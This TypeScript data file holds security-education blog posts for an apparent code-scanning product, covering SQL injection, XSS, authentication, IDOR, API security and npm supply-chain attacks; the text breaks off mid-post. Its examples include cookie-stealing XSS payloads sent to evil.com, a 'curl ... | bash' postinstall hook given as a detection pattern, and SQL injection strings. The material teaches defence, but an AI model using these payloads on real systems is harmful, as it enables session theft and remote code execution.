export interface BlogPost {
  slug: string;
  title: string;
  excerpt: string;
  content: string;
  author: string;
  date: string;
  readTime: string;
  category: string;
  tags: string[];
  coverImage?: string;
}

export const blogPosts: BlogPost[] = [
  {
    slug: 'sql-injection-prevention-guide',
    title: 'SQL Injection: The Silent Killer of Web Applications',
    excerpt: 'SQL injection remains one of the most dangerous and prevalent security vulnerabilities. Learn how attackers exploit poorly sanitized inputs and how to protect your applications.',
    category: 'Security',
    tags: ['SQL Injection', 'Database Security', 'OWASP Top 10'],
    author: 'CodeGuard AI',
    date: '2024-12-09',
    readTime: '8 min read',
    content: `
## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits security vulnerabilities in an application's database layer. It occurs when user input is incorrectly filtered or not properly sanitized, allowing attackers to insert malicious SQL statements into queries.

Despite being well-documented for over two decades, SQL injection continues to be one of the most critical security vulnerabilities, consistently appearing in the OWASP Top 10.

## How SQL Injection Works

Consider this vulnerable code:

\`\`\`javascript
// VULNERABLE CODE - DO NOT USE
const query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
db.query(query);
\`\`\`

An attacker could input:
- Username: \`admin' --\`
- Password: \`anything\`

This transforms the query into:
\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
\`\`\`

The \`--\` comments out the rest of the query, bypassing password verification entirely.

## Types of SQL Injection

### 1. Classic SQL Injection
Direct injection into SQL queries where results are visible in the application response.

### 2. Blind SQL Injection
The application doesn't show SQL errors, but attackers can infer information through:
- **Boolean-based**: Observing different responses for true/false conditions
- **Time-based**: Using \`SLEEP()\` or \`WAITFOR DELAY\` to measure response times

### 3. Union-based SQL Injection
Using \`UNION\` statements to combine results from multiple queries:
\`\`\`sql
' UNION SELECT username, password FROM users --
\`\`\`

## Real-World Impact

SQL injection has caused some of the largest data breaches in history:

- **2017 Equifax Breach**: 147 million records exposed
- **2011 Sony PlayStation Network**: 77 million accounts compromised
- **2008 Heartland Payment Systems**: 130 million credit cards stolen

## How CodeGuard AI Detects SQL Injection

Our AI-powered scanner analyzes your codebase for:

1. **String Concatenation in Queries**
   \`\`\`javascript
   // We detect patterns like:
   query = "SELECT * FROM " + table + " WHERE id = " + id;
   \`\`\`

2. **Missing Parameterized Queries**
   \`\`\`javascript
   // We recommend:
   db.query("SELECT * FROM users WHERE id = ?", [userId]);
   \`\`\`

3. **ORM Misuse**
   Even ORMs can be vulnerable when used incorrectly:
   \`\`\`javascript
   // Vulnerable
   User.where("name = '" + name + "'");

   // Safe
   User.where({ name: name });
   \`\`\`

## Prevention Strategies

### 1. Use Parameterized Queries (Prepared Statements)

**Node.js with MySQL:**
\`\`\`javascript
// Safe: Using parameterized queries
const [rows] = await connection.execute(
  'SELECT * FROM users WHERE username = ? AND password = ?',
  [username, hashedPassword]
);
\`\`\`

**Python with PostgreSQL:**
\`\`\`python
# Safe: Using parameterized queries
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, hashed_password)
)
\`\`\`

### 2. Use an ORM Properly

\`\`\`javascript
// Sequelize - Safe
const user = await User.findOne({
  where: { username, password: hashedPassword }
});

// Prisma - Safe
const user = await prisma.user.findUnique({
  where: { username }
});
\`\`\`

### 3. Input Validation

\`\`\`javascript
// Validate and sanitize inputs
const validator = require('validator');

if (!validator.isAlphanumeric(username)) {
  throw new Error('Invalid username format');
}
\`\`\`

### 4. Least Privilege Principle

Configure your database user with minimal permissions:
\`\`\`sql
-- Create a limited user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON myapp.* TO 'app_user'@'localhost';
-- Never grant DROP, DELETE, or admin privileges to app users
\`\`\`

### 5. Web Application Firewall (WAF)

Deploy a WAF to detect and block common SQL injection patterns as an additional layer of defense.

## Testing for SQL Injection

You can test your applications using:

1. **Manual Testing**: Try common payloads like \`' OR '1'='1\`
2. **Automated Tools**: SQLMap, Burp Suite, OWASP ZAP
3. **CodeGuard AI**: Automated static analysis of your codebase

## Conclusion

SQL injection is preventable with proper coding practices. Always:
- Use parameterized queries
- Validate all user inputs
- Follow the principle of least privilege
- Regularly scan your code with tools like CodeGuard AI

Stay secure, and never trust user input!
    `
  },
  {
    slug: 'xss-attacks-complete-guide',
    title: 'Cross-Site Scripting (XSS): Understanding and Preventing Script Injection',
    excerpt: 'XSS attacks allow hackers to inject malicious scripts into web pages. Discover the different types of XSS, how they work, and the definitive strategies to protect your users.',
    category: 'Security',
    tags: ['XSS', 'JavaScript Security', 'Web Security', 'OWASP Top 10'],
    author: 'CodeGuard AI',
    date: '2024-12-08',
    readTime: '10 min read',
    content: `
## What is Cross-Site Scripting (XSS)?

Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. When successful, these scripts execute in the victim's browser, potentially stealing sensitive data, hijacking sessions, or performing actions on behalf of the user.

XSS consistently ranks in the OWASP Top 10 and affects millions of websites worldwide.

## Types of XSS Attacks

### 1. Reflected XSS (Non-Persistent)

The malicious script comes from the current HTTP request. It's "reflected" back to the user.

**Example Attack:**
\`\`\`
https://example.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
\`\`\`

**Vulnerable Code:**
\`\`\`javascript
// VULNERABLE - DO NOT USE
app.get('/search', (req, res) => {
  res.send(\`<h1>Search results for: \${req.query.q}</h1>\`);
});
\`\`\`

### 2. Stored XSS (Persistent)

The malicious script is permanently stored on the target server (database, comment field, forum post). Every user who views the infected content becomes a victim.

**Example:**
An attacker posts a comment containing:
\`\`\`html
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: document.cookie
  });
</script>
\`\`\`

### 3. DOM-Based XSS

The vulnerability exists in client-side code rather than server-side. The malicious payload is executed by modifying the DOM environment.

**Vulnerable Code:**
\`\`\`javascript
// VULNERABLE - DO NOT USE
document.getElementById('output').innerHTML = location.hash.substring(1);
\`\`\`

**Attack:**
\`\`\`
https://example.com/page#<img src=x onerror=alert('XSS')>
\`\`\`

## Real-World XSS Impacts

- **Session Hijacking**: Stealing cookies to impersonate users
- **Credential Theft**: Injecting fake login forms
- **Malware Distribution**: Redirecting users to malicious sites
- **Defacement**: Modifying page content
- **Keylogging**: Recording user keystrokes

### Notable XSS Incidents

- **2018 British Airways**: XSS led to 380,000 payment card details stolen
- **2019 Fortnite**: Vulnerability could have exposed 200 million accounts
- **MySpace Samy Worm (2005)**: Self-propagating XSS worm infected 1 million profiles in 20 hours

## How CodeGuard AI Detects XSS

Our scanner identifies vulnerable patterns:

### 1. Unsafe HTML Insertion
\`\`\`javascript
// We flag:
element.innerHTML = userInput;
document.write(userData);
$(selector).html(content);
\`\`\`

### 2. Missing Output Encoding
\`\`\`javascript
// We detect unencoded outputs in templates:
res.send(\`<div>\${userData}</div>\`);
\`\`\`

### 3. React dangerouslySetInnerHTML
\`\`\`jsx
// We identify risky patterns:
<div dangerouslySetInnerHTML={{ __html: userContent }} />
\`\`\`

### 4. URL Parameter Injection
\`\`\`javascript
// We flag URL construction with user input:
window.location = 'javascript:' + userInput;
\`\`\`

## Prevention Strategies

### 1. Output Encoding (Escaping)

Always encode user data before rendering:

\`\`\`javascript
// Encode for HTML context
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, m => map[m]);
}

// Usage
res.send(\`<div>\${escapeHtml(userInput)}</div>\`);
\`\`\`

### 2. Content Security Policy (CSP)

Implement a strict CSP header to prevent inline script execution:

\`\`\`javascript
// Express.js
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
  );
  next();
});
\`\`\`

### 3. Use Safe APIs

\`\`\`javascript
// UNSAFE
element.innerHTML = userInput;

// SAFE
element.textContent = userInput;
\`\`\`

### 4. Framework-Specific Protection

**React** (auto-escapes by default):
\`\`\`jsx
// Safe - automatically escaped
<div>{userInput}</div>

// DANGEROUS - avoid unless absolutely necessary
<div dangerouslySetInnerHTML={{ __html: sanitizedHtml }} />
\`\`\`

**Vue.js:**
\`\`\`vue
<!-- Safe - automatically escaped -->
<div>{{ userInput }}</div>

<!-- DANGEROUS -->
<div v-html="userInput"></div>
\`\`\`

### 5. Sanitize HTML When Necessary

When you must render HTML, use a sanitization library:

\`\`\`javascript
import DOMPurify from 'dompurify';

// Sanitize HTML before rendering
const cleanHtml = DOMPurify.sanitize(userHtml);
element.innerHTML = cleanHtml;
\`\`\`

### 6. HTTP-Only Cookies

Prevent JavaScript access to session cookies:

\`\`\`javascript
res.cookie('sessionId', token, {
  httpOnly: true,  // Can't be accessed via JavaScript
  secure: true,    // Only sent over HTTPS
  sameSite: 'strict'
});
\`\`\`

## XSS Prevention Checklist

- [ ] Encode all user output based on context (HTML, JavaScript, URL, CSS)
- [ ] Implement Content Security Policy headers
- [ ] Use \`textContent\` instead of \`innerHTML\` where possible
- [ ] Sanitize any HTML that must be rendered
- [ ] Set \`HttpOnly\` flag on session cookies
- [ ] Validate and sanitize input on the server side
- [ ] Use modern frameworks that auto-escape by default
- [ ] Regularly scan code with CodeGuard AI

## Testing for XSS

Common test payloads:
\`\`\`
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
javascript:alert('XSS')
\`\`\`

## Conclusion

XSS vulnerabilities are entirely preventable with proper output encoding and security headers. Modern frameworks provide built-in protection, but developers must understand when that protection applies and when additional measures are needed.

Scan your codebase with CodeGuard AI to automatically detect XSS vulnerabilities before they reach production.
    `
  },
  {
    slug: 'authentication-security-best-practices',
    title: 'Authentication Security: Building Bulletproof Login Systems',
    excerpt: 'Learn how to implement secure authentication that protects your users from credential theft, brute force attacks, and session hijacking.',
    category: 'Security',
    tags: ['Authentication', 'Password Security', 'Session Management', 'OAuth'],
    author: 'CodeGuard AI',
    date: '2024-12-07',
    readTime: '12 min read',
    content: `
## Why Authentication Security Matters

Authentication is the front door to your application. A weak authentication system exposes every user to account takeover, data theft, and identity fraud. In 2023, credential-based attacks accounted for over 80% of web application breaches.

## Common Authentication Vulnerabilities

### 1. Weak Password Storage

**Never do this:**
\`\`\`javascript
// VULNERABLE - Plain text storage
await db.query('INSERT INTO users (email, password) VALUES (?, ?)',
  [email, password]);

// VULNERABLE - Simple hashing without salt
const hash = crypto.createHash('md5').update(password).digest('hex');
\`\`\`

### 2. Brute Force Susceptibility

Without rate limiting, attackers can try millions of password combinations.

### 3. Session Fixation

Accepting session IDs from URL parameters or failing to regenerate sessions after login.

### 4. Insecure Password Reset

Using predictable reset tokens or sending passwords via email.

## How CodeGuard AI Detects Auth Issues

Our scanner identifies:

\`\`\`javascript
// We flag weak password hashing:
crypto.createHash('md5').update(password);
crypto.createHash('sha1').update(password);

// We detect missing salt:
bcrypt.hashSync(password); // Missing rounds parameter

// We identify exposed credentials:
const password = 'hardcoded_secret';
\`\`\`

## Secure Password Storage

### Use bcrypt or Argon2

\`\`\`javascript
import bcrypt from 'bcrypt';

// Hash password for storage
const SALT_ROUNDS = 12;

async function hashPassword(password) {
  return bcrypt.hash(password, SALT_ROUNDS);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}

// Registration
const hashedPassword = await hashPassword(userPassword);
await db.query(
  'INSERT INTO users (email, password_hash) VALUES (?, ?)',
  [email, hashedPassword]
);

// Login
const user = await db.query('SELECT * FROM users WHERE email = ?', [email]);
const isValid = await verifyPassword(inputPassword, user.password_hash);
\`\`\`

### Why bcrypt?

1. **Built-in salt**: Each hash is unique
2. **Configurable cost**: Adjustable work factor
3. **Slow by design**: Resistant to brute force
4. **Battle-tested**: Decades of cryptographic review

## Implement Rate Limiting

\`\`\`javascript
import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts per window
  message: 'Too many login attempts. Please try again later.',
  standardHeaders: true,
  legacyHeaders: false,
});

// Apply to login route
app.post('/api/auth/login', loginLimiter, loginHandler);
\`\`\`

### Advanced: Account Lockout

\`\`\`javascript
async function handleLogin(email, password) {
  const user = await getUser(email);

  if (!user) {
    // Don't reveal whether email exists
    return { error: 'Invalid credentials' };
  }

  // Check if account is locked
  if (user.lockoutUntil && user.lockoutUntil > new Date()) {
    return { error: 'Account temporarily locked. Try again later.' };
  }

  const isValid = await verifyPassword(password, user.passwordHash);

  if (!isValid) {
    // Increment failed attempts
    await incrementFailedAttempts(user.id);

    if (user.failedAttempts >= 5) {
      await lockAccount(user.id, 30); // Lock for 30 minutes
    }

    return { error: 'Invalid credentials' };
  }

  // Reset failed attempts on successful login
  await resetFailedAttempts(user.id);
  return { success: true, user };
}
\`\`\`

## Secure Session Management

### Generate Cryptographically Secure Session IDs

\`\`\`javascript
import crypto from 'crypto';

function generateSessionId() {
  return crypto.randomBytes(32).toString('hex');
}
\`\`\`

### Set Secure Cookie Attributes

\`\`\`javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  name: 'sessionId', // Change default name
  cookie: {
    httpOnly: true,     // Prevent XSS access
    secure: true,       // HTTPS only
    sameSite: 'strict', // CSRF protection
    maxAge: 3600000     // 1 hour
  },
  resave: false,
  saveUninitialized: false
}));
\`\`\`

### Regenerate Session After Login

\`\`\`javascript
app.post('/login', async (req, res) => {
  const user = await authenticateUser(req.body);

  if (user) {
    // Regenerate session to prevent fixation
    req.session.regenerate((err) => {
      if (err) return res.status(500).send('Session error');

      req.session.userId = user.id;
      res.json({ success: true });
    });
  }
});
\`\`\`

## Multi-Factor Authentication (MFA)

### TOTP Implementation

\`\`\`javascript
import { authenticator } from 'otplib';
import QRCode from 'qrcode';

// Generate secret for user
async function enableMFA(userId) {
  const secret = authenticator.generateSecret();
  const otpauth = authenticator.keyuri(
    user.email,
    'CodeGuard AI',
    secret
  );

  // Store secret (encrypted) in database
  await db.query(
    'UPDATE users SET mfa_secret = ? WHERE id = ?',
    [encrypt(secret), userId]
  );

  // Generate QR code for authenticator app
  const qrCode = await QRCode.toDataURL(otpauth);
  return { qrCode, secret };
}

// Verify TOTP code
function verifyMFA(secret, token) {
  return authenticator.verify({ token, secret });
}
\`\`\`

## Secure Password Reset

\`\`\`javascript
import crypto from 'crypto';

async function initiatePasswordReset(email) {
  const user = await getUserByEmail(email);

  // Always return same response (prevent email enumeration)
  if (!user) {
    return { message: 'If the email exists, a reset link was sent.' };
  }

  // Generate secure token
  const token = crypto.randomBytes(32).toString('hex');
  const hashedToken = crypto
    .createHash('sha256')
    .update(token)
    .digest('hex');

  // Store hashed token with expiry
  await db.query(
    'UPDATE users SET reset_token = ?, reset_expires = ? WHERE id = ?',
    [hashedToken, Date.now() + 3600000, user.id] // 1 hour expiry
  );

  // Send email with unhashed token
  await sendEmail(email, \`Reset link: /reset-password?token=\${token}\`);

  return { message: 'If the email exists, a reset link was sent.' };
}

async function resetPassword(token, newPassword) {
  const hashedToken = crypto
    .createHash('sha256')
    .update(token)
    .digest('hex');

  const user = await db.query(
    'SELECT * FROM users WHERE reset_token = ? AND reset_expires > ?',
    [hashedToken, Date.now()]
  );

  if (!user) {
    return { error: 'Invalid or expired token' };
  }

  // Update password and clear reset token
  const hashedPassword = await bcrypt.hash(newPassword, 12);
  await db.query(
    'UPDATE users SET password_hash = ?, reset_token = NULL WHERE id = ?',
    [hashedPassword, user.id]
  );

  // Invalidate all existing sessions
  await db.query('DELETE FROM sessions WHERE user_id = ?', [user.id]);

  return { success: true };
}
\`\`\`

## OAuth 2.0 Best Practices

When implementing OAuth:

\`\`\`javascript
// Use state parameter to prevent CSRF
const state = crypto.randomBytes(16).toString('hex');
req.session.oauthState = state;

const authUrl = \`https://accounts.google.com/oauth?
  client_id=\${CLIENT_ID}&
  redirect_uri=\${REDIRECT_URI}&
  response_type=code&
  scope=email profile&
  state=\${state}\`;

// Verify state on callback
app.get('/oauth/callback', (req, res) => {
  if (req.query.state !== req.session.oauthState) {
    return res.status(403).send('Invalid state parameter');
  }
  // Continue with token exchange...
});
\`\`\`

## Authentication Security Checklist

- [ ] Passwords hashed with bcrypt/Argon2 (cost factor 12+)
- [ ] Rate limiting on login endpoints
- [ ] Account lockout after failed attempts
- [ ] Secure session configuration (httpOnly, secure, sameSite)
- [ ] Session regeneration after login
- [ ] MFA option available for users
- [ ] Secure password reset flow with expiring tokens
- [ ] No credential enumeration (same error for invalid email/password)
- [ ] HTTPS enforced everywhere
- [ ] Regular security scanning with CodeGuard AI

## Conclusion

Authentication security requires defense in depth. No single measure is sufficient—combine strong password hashing, rate limiting, secure sessions, and MFA to protect your users.

CodeGuard AI automatically scans for these vulnerabilities and provides actionable remediation steps. Secure your authentication before attackers exploit it.
    `
  },
  {
    slug: 'insecure-direct-object-references',
    title: 'IDOR Vulnerabilities: When Access Controls Fail',
    excerpt: 'Insecure Direct Object References (IDOR) allow attackers to access unauthorized data by manipulating object identifiers. Learn how to detect and prevent this common vulnerability.',
    category: 'Security',
    tags: ['IDOR', 'Access Control', 'Authorization', 'OWASP Top 10'],
    author: 'CodeGuard AI',
    date: '2024-12-06',
    readTime: '9 min read',
    content: \`
## What is IDOR?

Insecure Direct Object Reference (IDOR) is a type of access control vulnerability that occurs when an application exposes internal implementation objects to users. Attackers can manipulate these references to access unauthorized data.

IDOR vulnerabilities are deceptively simple but incredibly dangerous—they've led to some of the largest data breaches in recent years.

## How IDOR Works

Consider this vulnerable API endpoint:

\\\`\\\`\\\`javascript
// VULNERABLE - No authorization check
app.get('/api/users/:userId/profile', async (req, res) => {
  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.userId]);
  res.json(user);
});
\\\`\\\`\\\`

An attacker logged in as User 123 could simply change the URL:
- Legitimate: \\\`/api/users/123/profile\\\`
- Attack: \\\`/api/users/456/profile\\\`

And access another user's private data.

## Common IDOR Patterns

### 1. Sequential IDs

\\\`\\\`\\\`javascript
// Easy to enumerate
/api/orders/1001
/api/orders/1002
/api/orders/1003
\\\`\\\`\\\`

### 2. Hidden Form Fields

\\\`\\\`\\\`html
<!-- Vulnerable: User can modify this -->
<input type="hidden" name="user_id" value="123">
\\\`\\\`\\\`

### 3. File Downloads

\\\`\\\`\\\`
/download?file=invoice_123.pdf
/download?file=invoice_456.pdf  <!-- Another user's invoice -->
\\\`\\\`\\\`

### 4. API Endpoints

\\\`\\\`\\\`javascript
// All of these could be vulnerable
GET /api/accounts/{accountId}
DELETE /api/messages/{messageId}
PUT /api/settings/{settingId}
\\\`\\\`\\\`

## Real-World IDOR Breaches

- **2019 First American**: 885 million records exposed via simple URL manipulation
- **2021 Parler**: User data scraped via predictable sequential IDs
- **Facebook**: Multiple IDOR vulnerabilities allowing photo and message access

## How CodeGuard AI Detects IDOR

Our scanner identifies patterns like:

\\\`\\\`\\\`javascript
// We flag endpoints that use user-supplied IDs without auth checks:
app.get('/api/documents/:docId', (req, res) => {
  // Missing: Check if user owns this document
  const doc = await getDocument(req.params.docId);
  res.json(doc);
});

// We detect missing ownership validation:
app.delete('/api/posts/:postId', async (req, res) => {
  // Dangerous: Deletes any post without checking ownership
  await db.query('DELETE FROM posts WHERE id = ?', [req.params.postId]);
});
\\\`\\\`\\\`

## Prevention Strategies

### 1. Always Verify Ownership

\\\`\\\`\\\`javascript
// SECURE - Validates user owns the resource
app.get('/api/users/:userId/profile', authMiddleware, async (req, res) => {
  // Check if requested user matches authenticated user
  if (req.params.userId !== req.user.id) {
    return res.status(403).json({ error: 'Access denied' });
  }

  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.user.id]);
  res.json(user);
});
\\\`\\\`\\\`

### 2. Use Indirect References

\\\`\\\`\\\`javascript
// Instead of exposing database IDs
// Map to random tokens per session

const userDocumentMap = new Map();

// When listing documents for a user
function getDocumentToken(userId, docId) {
  const token = crypto.randomBytes(16).toString('hex');
  userDocumentMap.set(\\\`\\\${userId}:\\\${token}\\\`, docId);
  return token;
}

// When accessing a document
function getDocumentId(userId, token) {
  return userDocumentMap.get(\\\`\\\${userId}:\\\${token}\\\`);
}
\\\`\\\`\\\`

### 3. Include User Context in Queries

\\\`\\\`\\\`javascript
// SECURE - Always filter by authenticated user
app.get('/api/documents/:docId', authMiddleware, async (req, res) => {
  const doc = await db.query(
    'SELECT * FROM documents WHERE id = ? AND owner_id = ?',
    [req.params.docId, req.user.id]
  );

  if (!doc) {
    return res.status(404).json({ error: 'Document not found' });
  }

  res.json(doc);
});
\\\`\\\`\\\`

### 4. Use UUIDs Instead of Sequential IDs

\\\`\\\`\\\`javascript
// Harder to enumerate (but still requires auth checks!)
const { v4: uuidv4 } = require('uuid');

// Generate UUID for new records
const documentId = uuidv4(); // e.g., 'f47ac10b-58cc-4372-a567-0e02b2c3d479'
\\\`\\\`\\\`

### 5. Implement Role-Based Access Control

\\\`\\\`\\\`javascript
// Define permissions
const permissions = {
  admin: ['read', 'write', 'delete'],
  editor: ['read', 'write'],
  viewer: ['read']
};

// Check permission before action
function checkPermission(userRole, action) {
  return permissions[userRole]?.includes(action) || false;
}

app.delete('/api/posts/:postId', authMiddleware, async (req, res) => {
  if (!checkPermission(req.user.role, 'delete')) {
    return res.status(403).json({ error: 'Insufficient permissions' });
  }

  // Also check ownership for non-admins
  if (req.user.role !== 'admin') {
    const post = await getPost(req.params.postId);
    if (post.authorId !== req.user.id) {
      return res.status(403).json({ error: 'Not your post' });
    }
  }

  await deletePost(req.params.postId);
  res.json({ success: true });
});
\\\`\\\`\\\`

## IDOR Prevention Checklist

- [ ] Every endpoint verifies the user has access to the requested resource
- [ ] Use UUIDs instead of sequential integers for IDs
- [ ] Include user context in all database queries
- [ ] Implement proper role-based access control
- [ ] Log all access attempts for auditing
- [ ] Regularly test with different user accounts
- [ ] Scan with CodeGuard AI to detect missing authorization checks

## Conclusion

IDOR vulnerabilities are easy to introduce and easy to exploit. The fix is straightforward: always verify that the authenticated user has permission to access or modify the requested resource.

Use CodeGuard AI to automatically detect missing authorization checks before they become breaches.
    \`
  },
  {
    slug: 'secure-api-design-guide',
    title: 'Secure API Design: Building APIs That Resist Attack',
    excerpt: 'APIs are the backbone of modern applications—and a prime target for attackers. Learn the essential security patterns for building robust, secure APIs.',
    category: 'Best Practices',
    tags: ['API Security', 'REST', 'Authentication', 'Rate Limiting'],
    author: 'CodeGuard AI',
    date: '2024-12-05',
    readTime: '11 min read',
    content: \`
## Why API Security Matters

APIs now handle the majority of web traffic. They're also responsible for 90% of web application attack surface. A single vulnerable endpoint can expose your entire database.

## Common API Security Mistakes

### 1. Broken Authentication

\\\`\\\`\\\`javascript
// VULNERABLE - No token validation
app.get('/api/user', (req, res) => {
  const userId = req.headers['x-user-id'];
  // Trusting client-provided user ID!
  const user = await getUser(userId);
  res.json(user);
});
\\\`\\\`\\\`

### 2. Excessive Data Exposure

\\\`\\\`\\\`javascript
// VULNERABLE - Returns sensitive fields
app.get('/api/users/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // Includes password hash, SSN, etc.
});
\\\`\\\`\\\`

### 3. Missing Rate Limiting

\\\`\\\`\\\`javascript
// VULNERABLE - No rate limiting
app.post('/api/login', (req, res) => {
  // Can be brute-forced endlessly
});
\\\`\\\`\\\`

### 4. SQL/NoSQL Injection

\\\`\\\`\\\`javascript
// VULNERABLE - User input in query
app.get('/api/search', (req, res) => {
  const results = await db.collection('users').find({
    name: { $regex: req.query.q } // NoSQL injection!
  });
});
\\\`\\\`\\\`

## How CodeGuard AI Secures Your APIs

We detect:

\\\`\\\`\\\`javascript
// Missing authentication middleware
app.get('/api/admin/users', adminController.list); // No auth!

// Excessive data exposure
res.json(user); // Flags when returning password fields

// Dangerous query patterns
db.query(\\\`SELECT * FROM users WHERE name = '\\\${name}'\\\`);
\\\`\\\`\\\`

## API Security Best Practices

### 1. Implement Proper Authentication

\\\`\\\`\\\`javascript
import jwt from 'jsonwebtoken';

// JWT middleware
const authenticate = (req, res, next) => {
  const token = req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    req.user = decoded;
    next();
  } catch (error) {
    return res.status(401).json({ error: 'Invalid token' });
  }
};

// Protected route
app.get('/api/profile', authenticate, (req, res) => {
  res.json({ user: req.user });
});
\\\`\\\`\\\`

### 2. Use Response DTOs (Data Transfer Objects)

\\\`\\\`\\\`javascript
// Define what fields to expose
class UserDTO {
  constructor(user) {
    this.id = user.id;
    this.name = user.name;
    this.email = user.email;
    this.avatar = user.avatarUrl;
    // Explicitly exclude: password, ssn, internalNotes
  }
}

app.get('/api/users/:id', authenticate, async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(new UserDTO(user)); // Only safe fields
});
\\\`\\\`\\\`

### 3. Implement Rate Limiting

\\\`\\\`\\\`javascript
import rateLimit from 'express-rate-limit';

// General API rate limit
const apiLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // 100 requests per window
  standardHeaders: true,
  message: { error: 'Too many requests' }
});

// Stricter limit for auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Too many login attempts' }
});

app.use('/api/', apiLimiter);
app.use('/api/auth/', authLimiter);
\\\`\\\`\\\`

### 4. Validate All Input

\\\`\\\`\\\`javascript
import { z } from 'zod';

// Define schema
const createUserSchema = z.object({
  email: z.string().email(),
  name: z.string().min(2).max(100),
  password: z.string().min(8).max(128)
});

// Validation middleware
const validate = (schema) => (req, res, next) => {
  try {
    schema.parse(req.body);
    next();
  } catch (error) {
    res.status(400).json({
      error: 'Validation failed',
      details: error.errors
    });
  }
};

app.post('/api/users', validate(createUserSchema), createUser);
\\\`\\\`\\\`

### 5. Use Parameterized Queries

\\\`\\\`\\\`javascript
// SAFE - Parameterized query
const user = await db.query(
  'SELECT * FROM users WHERE email = $1',
  [email]
);

// SAFE - ORM with proper escaping
const user = await User.findOne({
  where: { email: email }
});
\\\`\\\`\\\`

### 6. Implement Proper Error Handling

\\\`\\\`\\\`javascript
// Don't expose internal errors
app.use((err, req, res, next) => {
  console.error(err.stack); // Log full error internally

  // Return generic message to client
  res.status(500).json({
    error: 'Internal server error',
    requestId: req.id // For support reference
  });
});
\\\`\\\`\\\`

### 7. Add Security Headers

\\\`\\\`\\\`javascript
import helmet from 'helmet';

app.use(helmet());

// Custom headers
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});
\\\`\\\`\\\`

### 8. Enable CORS Properly

\\\`\\\`\\\`javascript
import cors from 'cors';

// Don't use cors() with no options in production!
const corsOptions = {
  origin: ['https://yourdomain.com', 'https://app.yourdomain.com'],
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,
  maxAge: 86400
};

app.use(cors(corsOptions));
\\\`\\\`\\\`

## API Security Checklist

- [ ] All endpoints require authentication (except public ones)
- [ ] JWT/session tokens have reasonable expiration
- [ ] Rate limiting on all endpoints
- [ ] Input validation on all parameters
- [ ] Parameterized queries for database access
- [ ] Response DTOs to prevent data leakage
- [ ] Security headers configured
- [ ] CORS properly restricted
- [ ] Errors don't expose internals
- [ ] All API calls logged for audit
- [ ] Regular scanning with CodeGuard AI

## Conclusion

API security requires multiple layers of defense. No single measure is sufficient. Implement authentication, authorization, validation, and monitoring together.

Use CodeGuard AI to continuously scan your APIs for vulnerabilities and misconfigurations.
    \`
  },
  {
    slug: 'dependency-vulnerabilities-npm-security',
    title: 'NPM Security: Managing Dependencies Without Getting Hacked',
    excerpt: 'Your application is only as secure as its dependencies. Learn how to audit, manage, and secure your npm packages against supply chain attacks.',
    category: 'Security',
    tags: ['NPM', 'Dependencies', 'Supply Chain', 'Node.js'],
    author: 'CodeGuard AI',
    date: '2024-12-04',
    readTime: '8 min read',
    content: \`
## The Hidden Danger in node_modules

The average Node.js project has over 1,000 dependencies in its dependency tree. Each one is a potential attack vector. In 2021, malicious npm packages were downloaded over 40 million times before detection.

## Famous NPM Security Incidents

### event-stream (2018)
A maintainer handed over control to a stranger who injected cryptocurrency-stealing code. Affected 8 million downloads.

### ua-parser-js (2021)
Hijacked package deployed cryptominers and password stealers to 7 million weekly downloaders.

### colors & faker (2022)
Maintainer intentionally sabotaged packages, breaking thousands of applications.

## How Attackers Exploit Dependencies

### 1. Typosquatting

\\\`\\\`\\\`bash
# Attacker creates similar-named malicious packages
npm install lodahs     # Typo of 'lodash'
npm install electorn   # Typo of 'electron'
\\\`\\\`\\\`

### 2. Dependency Confusion

Attackers publish public packages with the same name as private internal packages, exploiting resolution priority.

### 3. Maintainer Account Takeover

Compromising maintainer credentials to push malicious updates.

### 4. Malicious Postinstall Scripts

\\\`\\\`\\\`json
{
  "scripts": {
    "postinstall": "node steal-env-vars.js"
  }
}
\\\`\\\`\\\`

## How CodeGuard AI Protects You

We scan for:

\\\`\\\`\\\`javascript
// Known vulnerable packages
"dependencies": {
  "lodash": "4.17.20"  // CVE-2021-23337: Prototype pollution
}

// Suspicious patterns in dependencies
"postinstall": "curl http://evil.com/script.sh | bash"

// Packages with security advisories
"serialize-javascript": "2.1.0"  // RCE vulnerability
\\\`\\\`\\\`

## Securing Your Dependencies

### 1. Regular Audits

\\\`\\\`\\\`bash
# Built-in npm audit
npm audit

# Get detailed report
npm audit --json

# Auto-fix where possible
npm audit fix

# Force fix (may have breaking changes)
npm audit fix --force
\\\`\\\`\\\`

### 2. Lock Your Dependencies

\\\`\\\`\\\`json
// package.json - Use exact versions
